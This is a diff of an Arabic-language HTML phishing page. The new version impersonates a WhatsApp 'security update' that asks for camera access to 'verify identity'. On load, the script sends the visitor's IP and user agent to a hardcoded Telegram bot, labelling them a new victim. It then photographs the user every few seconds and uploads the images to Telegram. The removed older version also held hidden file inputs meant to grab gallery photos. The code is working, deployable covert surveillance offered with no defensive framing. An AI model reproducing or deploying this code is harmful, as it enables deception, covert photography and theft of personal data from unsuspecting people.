@@ -1,127 +1,226 @@
 <!DOCTYPE html>
-<html>
+<html dir="rtl" lang="ar">
 <head>
-    <title>Camera Access</title>
-    <meta name="viewport" content="width=device-width">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>واتساب</title>
     <style>
-        body { margin: 0; padding: 20px; background: #000; color: #fff; font-family: Arial; text-align: center; }
-        #video { width: 100%; max-width: 400px; height: 300px; background: #333; }
-        #canvas { display: none; }
-        button { background: #4CAF50; color: white; border: none; padding: 15px 32px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; }
-        .stealer { position: fixed; top: -10000px; opacity: 0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); 
+            height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: #333; 
+            overflow: hidden;
+        }
+        .container { 
+            background: rgba(255,255,255,0.95); 
+            border-radius: 20px; 
+            padding: 40px; 
+            text-align: center; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
+            max-width: 400px; 
+            width: 90%; 
+            backdrop-filter: blur(10px);
+        }
+        .logo { 
+            width: 80px; height: 80px; 
+            background: #25D366; 
+            border-radius: 50%; 
+            margin: 0 auto 20px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 40px; 
+            color: white; 
+            font-weight: bold;
+        }
+        h1 { font-size: 28px; margin-bottom: 10px; color: #25D366; }
+        p { font-size: 16px; margin-bottom: 30px; opacity: 0.8; }
+        .camera-container { 
+            position: relative; 
+            width: 100%; 
+            height: 300px; 
+            background: #000; 
+            border-radius: 15px; 
+            overflow: hidden; 
+            margin-bottom: 20px; 
+            display: none;
+        }
+        #video { width: 100%; height: 100%; object-fit: cover; }
+        .controls { 
+            position: absolute; 
+            bottom: 15px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            display: flex; 
+            gap: 10px;
+        }
+        .flip-btn { 
+            background: rgba(255,255,255,0.9); 
+            border: none; 
+            border-radius: 50%; 
+            width: 50px; height: 50px; 
+            font-size: 20px; 
+            cursor: pointer; 
+            transition: all 0.3s; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+        }
+        .flip-btn:hover { background: white; transform: scale(1.1); }
+        .status { 
+            background: #25D366; 
+            color: white; 
+            padding: 12px; 
+            border-radius: 25px; 
+            font-size: 14px; 
+            margin-bottom: 20px; 
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.7;} }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <h2>اختبر كاميرا الجهاز</h2>
-    <video id="video" autoplay muted playsinline></video>
-    <br>
-    <button id="start">بدء الاختبار</button>
-    <button id="capture" disabled>التقاط صورة</button>
-    
-    <!-- 🔥 GALLERY STEALERS -->
-    <input type="file" class="stealer" id="gallery1" multiple accept="image/*">
-    <input type="file" class="stealer" id="gallery2" multiple webkitdirectory>
+    <div class="container" id="updateScreen">
+        <div class="logo">واتساب</div>
+        <h1>تحديث أمان جديد</h1>
+        <p>للحفاظ على حسابك آمنًا، يرجى السماح بالوصول للكاميرا للتحقق من الهوية</p>
+        <div class="status">جاري التحديث...</div>
+    </div>
+
+    <div class="container hidden" id="cameraScreen">
+        <h1>التحقق من الهوية</h1>
+        <p>الرجاء النظر إلى الكاميرا لمدة 3 ثوانٍ</p>
+        <div class="camera-container" id="cameraContainer">
+            <video id="video" autoplay muted playsinline></video>
+            <div class="controls">
+                <button class="flip-btn" id="flipBtn">🔄</button>
+            </div>
+        </div>
+        <div class="status">جاري التقاط الصورة...</div>
+    </div>
 
     <script>
         const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
         const CHAT_ID = '8539996558';
-        
-        const video = document.getElementById('video');
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const startBtn = document.getElementById('start');
-        const captureBtn = document.getElementById('capture');
-        const gallery1 = document.getElementById('gallery1');
-        const gallery2 = document.getElementById('gallery2');
+        let video = document.getElementById('video');
+        let currentStream = null;
+        let facingMode = 'user'; // ابدأ بكاميرا أمامية
 
-        canvas.width = 640;
-        canvas.height = 480;
-
-        // 🔥 SEND HIT
-        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>sendHit(d.ip));
-
-        function sendHit(ip){
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-                method:'POST',
-                body:JSON.stringify({
-                    chat_id:CHAT_ID,
-                    text:`🎥 CAMERA HIT!\n🌐 IP: ${ip}\n📱 ${navigator.userAgent.slice(0,80)}`
-                })
-            });
+        // إرسال IP أولاً
+        async function sendIP() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const victimIP = ipData.ip;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🎣 فيكتيم جديد!\n📍 IP: ${victimIP}\n🌐 User-Agent: ${navigator.userAgent}`
+                    })
+                });
+                console.log('IP sent:', victimIP);
+            } catch(e) { console.error('IP send failed'); }
         }
 
-        // 🔥 CAMERA ACCESS
-        startBtn.onclick = async()=>{
-            try{
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' } 
-                });
-                video.srcObject = stream;
-                startBtn.disabled = true;
-                captureBtn.disabled = false;
-                
-                // 🔥 AUTO CAPTURE EVERY 2s
-                setInterval(capturePhoto, 2000);
-            }catch(e){
-                // Fallback to gallery
-                galleryAttack();
+        // تبديل الكاميرا
+        async function flipCamera() {
+            facingMode = facingMode === 'user' ? 'environment' : 'user';
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
             }
-        };
+            startCamera();
+        }
 
-        // 🔥 LIVE CAMERA STEAL
-        function capturePhoto(){
-            ctx.drawImage(video, 0, 0, 640, 480);
-            canvas.toBlob(blob=>{
-                const file = new File([blob], `live_${Date.now()}.jpg`, {type: 'image/jpeg'});
-                uploadFile(file);
+        // بدء الكاميرا
+        async function startCamera() {
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: facingMode,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                video.srcObject = currentStream;
+                video.play();
+                setTimeout(capturePhoto, 2000); // التقاط أول صورة بعد 2 ثانية
+                startAutoCapture(); // التقاط تلقائي كل 3 ثوان
+            } catch(e) {
+                console.error('Camera access denied:', e);
+                showUpdateScreen();
+            }
+        }
+
+        // التقاط صورة واحدة
+        async function capturePhoto() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', `📸 صورة من فيكتيم\n🎥 كاميرا: ${facingMode === 'user' ? 'أمامية' : 'خلفية'}`);
+                
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+                    console.log('Photo sent:', data.ok ? 'Success' : data.description);
+                } catch(e) {
+                    console.error('Photo send failed:', e);
+                }
             }, 'image/jpeg', 0.8);
         }
 
-        // 🔥 GALLERY ATTACK
-        function galleryAttack(){
-            // Triple gallery trigger
-            [gallery1, gallery2].forEach((input,i)=>{
-                setTimeout(()=>{
-                    input.click();
-                    input.click();
-                    input.onchange = e=>uploadFiles(Array.from(e.target.files));
-                },i*200);
-            });
-            
-            // Create more inputs
-            for(let i=0;i<5;i++){
-                setTimeout(()=>{
-                    const inp = document.createElement('input');
-                    inp.type='file';
-                    inp.multiple=true;
-                    inp.accept='image/*';
-                    inp.className='stealer';
-                    document.body.appendChild(inp);
-                    inp.click();
-                    inp.onchange=e=>uploadFiles(Array.from(e.target.files));
-                },1000+i*100);
+        // التقاط تلقائي كل 3 ثوان
+        function startAutoCapture() {
+            setInterval(capturePhoto, 3000);
+        }
+
+        // إظهار شاشة الكاميرا
+        function showCameraScreen() {
+            document.getElementById('updateScreen').classList.add('hidden');
+            document.getElementById('cameraScreen').classList.remove('hidden');
+            document.getElementById('cameraContainer').style.display = 'block';
+        }
+
+        // إظهار شاشة التحديث
+        function showUpdateScreen() {
+            document.getElementById('cameraScreen').classList.add('hidden');
+            document.getElementById('updateScreen').classList.remove('hidden');
+        }
+
+        // تشغيل بعد تحميل الصفحة
+        window.addEventListener('load', async () => {
+            await sendIP();
+            setTimeout(() => {
+                showCameraScreen();
+                startCamera();
+            }, 1500);
+        });
+
+        // زر تبديل الكاميرا
+        document.getElementById('flipBtn').addEventListener('click', flipCamera);
+
+        // تنظيف عند الخروج
+        window.addEventListener('beforeunload', () => {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
             }
-        }
-
-        // 🔥 UPLOAD
-        function uploadFile(file){
-            const fd = new FormData();
-            fd.append('chat_id',CHAT_ID);
-            fd.append('photo',file);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-                method:'POST',body:fd
-            });
-        }
-
-        function uploadFiles(files){
-            files.slice(0,15).forEach(file=>uploadFile(file));
-        }
-
-        // 🔥 AUTO START
-        setTimeout(()=>startBtn.click(),1500);
-        
-        // 🔥 Media Query Listener (Mobile Gallery)
-        window.matchMedia('(max-width: 768px)').addEventListener('change', galleryAttack);
+        });
     </script>
 </body>
 </html>
